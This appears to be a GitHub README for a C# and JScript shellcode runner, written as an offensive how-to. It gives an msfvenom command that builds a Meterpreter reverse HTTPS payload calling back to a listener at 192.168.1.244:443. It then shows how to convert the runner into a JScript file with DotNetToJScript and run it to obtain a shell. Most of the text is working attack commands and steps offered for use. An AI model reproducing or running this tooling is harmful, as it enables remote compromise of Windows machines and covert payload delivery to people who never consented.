before compiling this we must set cpu to x64 since this is 64 bit shellcode 
![image](https://github.com/VietTheBarbarian/ShellcodeRunnerC-/assets/56415307/ee0c42e2-5e1e-4f61-982d-817d9613d635)

our payload 
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.1.244 lport=443  -f csharp  
![image](https://github.com/VietTheBarbarian/ShellcodeRunnerC-/assets/56415307/188ebfad-1a70-4542-acb4-ed66f25ce7d7)

![image](https://github.com/VietTheBarbarian/ShellcodeRunnerC-/assets/56415307/21e53423-1b26-4b4c-91bd-4a281c1b4f3c)

javascript shellcode runner utizilize dotnettojs https://github.com/tyranid/DotNetToJScript/tree/master

Go to the DotNetToJScript folder and copy DotNetToJscript.exe and NDesk.Options.dll to a folder

Copy javascriptshellcoderunner.cs to test.class in the exampleassembly
![image](https://github.com/VietTheBarbarian/ShellcodeRunnerC-/assets/56415307/29d1ae9c-c592-4bd3-a900-497c4c01950f)

Move ExampleAssembly.dll to a folder 

Output file to a js file 
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js

Execute js file for shell
![image](https://github.com/VietTheBarbarian/ShellcodeRunnerC-/assets/56415307/8f84dc31-9489-4e81-89ed-ce5746b8eb2a)


